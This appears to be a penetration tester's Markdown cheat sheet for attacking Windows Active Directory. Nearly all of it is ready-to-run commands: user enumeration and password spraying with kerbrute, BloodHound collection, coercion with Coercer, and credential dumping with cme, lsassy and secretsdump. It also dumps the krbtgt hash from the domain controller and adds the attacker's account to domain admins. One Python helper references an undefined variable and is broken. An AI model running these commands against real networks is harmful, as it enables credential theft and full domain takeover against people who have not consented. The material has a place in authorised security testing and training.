---
title: "Active Directory"
---

<p style="text-align: right">_- last update 31/01/2023 -_</p>

## Usefull links

[List of default AD groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)

## Unauthenticated Enumerateion

### Find domain name

You may find the domain name in DHCP offers. Start wireshark and plug your host
on the network.

### Find domain controllers

```bash
nmap --script dns-srv-enum --script-args dns-srv-enum.domain=$DOMAIN
```

### Domain metadata

The following command extracts interesting informations on your AD.
The most useful is probably the "domainFunctionnality", which is showing the
compatibility level of your domain with old (and therefor vulnerable) microsoft
versions and protocoles.

```bash
windapsearch -d $DOMAIN_FQDN -m metadata
```

For exemple the following oneliner is extracting the functionality level for
each DC.

```bash
for host in $(cat ads.txt); do 
  printf "$host "
  timeout 3 windapsearch -d "$DOMAIN_FQDN" --dc "$host" -m metadata \
    | grep -e 'domainControllerFunctionality'
  echo; sleep 3
done | tee funclevel.txt
```

## Get an initial valid account

### User enumeration

```bash
kerbrute userenum -d $DOMAIN ./usernames.txt
```

### Password spraying

```bash
kerbrute passwordspray -d $DOMAIN --user-as-pass ./usernames.txt
```

## Authenticated Enumeration

### Extract Authenticatied ldap informations

Dump computers

```bash
windapsearch -d $DOMAIN -u $USER -p $PASSWORD -m computers \
  | grep -i dnshostname \
  | cut -d ':' -f 2 \
  | tr -d ' ' | tr '[:upper:]' '[:lower:]' \
  | sort -u | tee computers.txt
```

Dump users

```bash
windapsearch -d $DOMAIN -u $USER -p $PASSWORD -m users
```

Dump password policy

```bash
cme smb $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD --pass-pol
```

### Dump the whole forest

Use either

* [SharpHound](https://github.com/BloodHoundAD/SharpHound)
* [Bloodhound python](https://github.com/fox-it/BloodHound.py).

Put the `bloodhound-python` command in your current path :

```bash
#!/bin/sh

DOCKERFILE=$(mktemp)

cat > $DOCKERFILE <<EOF
FROM python:3
RUN pip install bloodhound
CMD bloodhound-python
EOF

podman build -t bloodhound-python -f $DOCKERFILE

alias bloodhound-python='podman run bloodhound-python'
```

Extract the forest

```bash
bloodhound-python --zip -c All -d $DOMAIN_FQDN -u $USER -p "$PASSWORD" -dc $DOMAIN_CONTROLER --disable-pooling -w 1
```

### Extract informations from bloodhound dump

Once you have the data, you can freely query the LDAP database offline. Here are
some examples.

Generate a json with only the juicy informations about each users.

```bash
jq '.data | .[].Properties | {name: .name, display: .displayname, title: .title, desc: .description}' users.json | tee filtered_users.json
```

Look for a user using it's ID.

```bash
jq '.data | .[].Properties | select(.name == "<user-id>@<domain-fqdn>")' users.json
```

Extract usernames.

```bash
jq -r '.data | .[].Properties.name' input.json | cut -d '@' -f 1 | tr '[:upper:]' '[:lower:]' | tee usernames.json
```

### Find exploitation paths using bloodhound

Upload your `*.json` files to bloodhound for him to build a graph. You can then
search for specific targets or use the pre-defined queries.

Look for the query called "shortest path to admin" and export the graph.

_TODO : screenshot_

Extract every ldap objects from the graph into a `graph_objects.txt`.

```bash
sed -n 's/^[ ]*"\(.*\)@SAMPLE.DOMAIN.LOCAL.*/\1/p' graph.json | sort -u | tee graph_objects.txt
```

At this point the `graph_objects.txt` contains users, laptops and groups. You
can use the following python script to cross reference object that are only
users (using the extracted informations from previous section).

This python script takes a `graph_objects.txt` and a `all_users.txt` and stores
only real users inside `graph_users.txt`.

```python
valid_users = []

with open('all_users.txt', 'r') as f_all_users:
  all_users = f_all_users.read().split('\n')

with open('graph_objects.txt', 'r') as f_graph_users:
  graph_object = f_graph_object.read().split('\n')

for obj in graph_object:
  if obj in all_users:
    print(f'{obj} is a valid user')
    valid_users.append(obj)

with open('graph_users.txt', 'w') as f_graph_users:
  f_graph_users.write('\n'.join(valid_users))
```

You can then focus your attacks ([spraying](../smb) or phishing for example) on these users only.

### Tracking changes in the forest

Use [LDAPmonitor](https://github.com/p0dalirius/LDAPmonitor).

You can detect locked accounts, privilege escalations and see best activity peak
to launch poisonning.



## Horizontal Privesc

### Coerce Windows Hosts

[-COERCER-](https://github.com/p0dalirius/Coercer)

```bash
coercer coerce -u $USER -p $PASSWORD -d $DOMAIN -t $TARGET_FQDN -l $TARGET_IP
```

(If you find an NTHASH, use [ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi))

### Find AD Certificate Services

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -old-bloodhound
```

### Read LAPS computer's password

Use [pyLAPS](https://github.com/p0dalirius/pyLAPS).

LAPS = Local Administrator Password Solution.

### Dump secrets from memory

Before using any of the following tools, build the `targets.txt` file. For this:

1. launch bloodhound (see above)
2. find your user with the search bar
3. clic `Derivative local admin rights`
4. export the resulting graph to a json file (`extract.json`)
5. extract computer names from the json

```bash
jq -r '.nodes | .[] | select(.type == "Computer") | .label' extract.json | tee targets.txt
```

#### CME

```bash
cme smb -d $DOMAIN -u $USER -p $PASS --lsa ./targets.txt
cme smb -d $DOMAIN -u $USER -p $PASS --sam ./targets.txt
```

#### Lsassy

```bash
lsassy  -d $DOMAIN -u $USER -p $PASS ./targets.txt
```

#### Secretsdump

```bash
secretsdump -outputfile output.txt $DOMAIN/$USER:$PASS@$TARGET
```


## Post exploitation

Dump the NTDS database (`$TARGET` is one of the domain controller)

```bash
secretsdump -outputfile $DOMAIN -just-dc-user krbtgt -hashes $HASH $DOMAIN/$USER@$TARGET
```

Add your user to the domain admins group (use `pth-net` for using a `$HASH` instead of `$PASS`)

```bash
net rpc group addmem $ADMIN_GROUPNAME $ATTACKER_USERNAME -U $DOMAIN/$ADMIN_USERNAME%$ADMIN_PASSWORD -I $DC_IP
```
